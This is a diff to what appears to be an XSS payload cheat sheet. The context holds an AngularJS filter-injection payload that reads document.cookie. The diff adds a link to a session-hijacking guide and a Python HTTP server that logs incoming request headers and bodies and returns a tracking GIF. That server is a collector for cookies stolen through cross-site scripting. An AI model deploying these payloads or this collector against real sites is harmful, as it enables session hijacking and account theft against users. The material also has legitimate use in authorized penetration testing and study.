@@ -472,6 +472,50 @@ function handleResponse() {
 
 <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
 ```
+### XSS Session Hijacking
+https://hackingbr.gitbook.io/hacking-br/web/cross-site-scripting/xss-session-hijacking
+
+### Python script to Listening connections
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import datetime
+
+class BHandler(BaseHTTPRequestHandler):
+    def _log(self):
+        print(f"\n--- {datetime.datetime.utcnow().isoformat()} UTC ---")
+        print(f"Remote: {self.client_address}")
+        print(f"Request: {self.command} {self.path}")
+        for k, v in self.headers.items():
+            print(f"{k}: {v}")
+        length = int(self.headers.get('Content-Length', 0))
+        if length:
+            body = self.rfile.read(length).decode(errors='replace')
+            print("Body:\n" + body)
+
+    def do_GET(self):
+        self._log()
+        self.send_response(200)
+        self.send_header("Content-Type", "image/gif")
+        self.end_headers()
+        # return a 1x1 transparent GIF
+        self.wfile.write(
+            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!'
+            b'\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01'
+            b'\x00\x00\x02\x02D\x01\x00;'
+        )
+
+    def do_POST(self):
+        self._log()
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+if __name__ == "__main__":
+    HOST = "0.0.0.0"
+    PORT = 8000
+    print(f"Listening on {HOST}:{PORT} ...")
+    HTTPServer((HOST, PORT), BHandler).serve_forever()
+```
 
 
 
